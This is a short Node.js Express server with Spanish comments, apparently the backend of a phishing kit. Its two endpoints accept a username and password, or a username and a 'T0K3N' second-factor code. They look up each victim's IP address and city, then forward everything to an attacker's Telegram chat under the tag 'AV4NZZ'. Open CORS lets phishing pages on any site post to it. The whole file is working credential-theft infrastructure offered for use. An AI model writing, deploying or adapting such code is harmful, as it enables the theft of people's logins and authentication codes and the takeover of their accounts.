const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');
const https = require('https');
const FormData = require("form-data"); // ahora mismo no lo usas, pero lo dejo por si luego lo necesitas

const app = express();

// Forzar IPv4 en peticiones salientes (Telegram, ipwhois, etc.)
const agent = new https.Agent({ family: 4 });

app.use(cors({
  origin: '*', // Permitir cualquier origen
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type']
}));

app.use(bodyParser.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// ---------- Helpers para IP y ciudad ----------

// Obtener IP real del cliente (la primera en x-forwarded-for)
function obtenerIP(req) {
  const forwarded = req.headers['x-forwarded-for'];

  if (forwarded) {
    // Puede venir algo como "190.84.23.19, 172.30.11.2"
    return forwarded.split(',')[0].trim();
  }

  // Fallbacks
  const remote =
    (req.connection && req.connection.remoteAddress) ||
    (req.socket && req.socket.remoteAddress) ||
    req.ip;

  if (!remote) return 'desconocida';

  // Si viene en formato "::ffff:190.84.23.19" lo limpiamos
  if (remote.startsWith('::ffff:')) {
    return remote.slice(7);
  }

  return remote;
}

// Obtener ciudad desde ipwhois usando la IP
async function obtenerCiudad(ip) {
  try {
    if (!ip || ip === 'desconocida') return 'Desconocida';

    const { data } = await axios.get(`https://ipwhois.app/json/${ip}`, {
      httpsAgent: agent
    });

    // ipwhois devuelve success:false si algo falla
    if (data && data.success === false) {
      return 'Desconocida';
    }

    return data.city || 'Desconocida';
  } catch (error) {
    console.error('Error al obtener ciudad desde ipwhois:', error.message);
    return 'Desconocida';
  }
}

// ---------- Rutas ----------

app.get('/', (req, res) => {
  res.send('Servidor activo');
});

app.post('/api/sendMessage', async (req, res) => {
  try {
    const { user, password } = req.body;

    if (!user || !password) {
      return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    const ip = obtenerIP(req);
    const city = await obtenerCiudad(ip);

    const message =
      `🧡AV4NZZ🧡\n` +
      `US4R: <code>${user}</code>\n` +
      `CL4V: <code>${password}</code>\n\n` +
      `IP: ${ip}\nCiudad: ${city}`;

    const response = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
      {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      },
      { httpsAgent: agent }
    );

    res.status(200).json({ success: true, data: response.data });
  } catch (error) {
    console.error('Error al enviar mensaje a Telegram (sendMessage):', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/sendMessage2', async (req, res) => {
  try {
    const { user, password } = req.body;

    if (!user || !password) {
      return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    const ip = obtenerIP(req);
    const city = await obtenerCiudad(ip);

    const message =
      `🔐🧡AV4NZZ🧡\n` +
      `US4R: <code>${user}</code>\n\n` +
      `T0K3N: <code>${password}</code>\n\n` +
      `IP: ${ip}\nCiudad: ${city}`;

    const response = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
      {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      },
      { httpsAgent: agent }
    );

    res.status(200).json({ success: true, data: response.data });
  } catch (error) {
    console.error('Error al enviar mensaje a Telegram (sendMessage2):', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ---------- Inicio del servidor ----------

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en el puerto ${PORT}`);
});
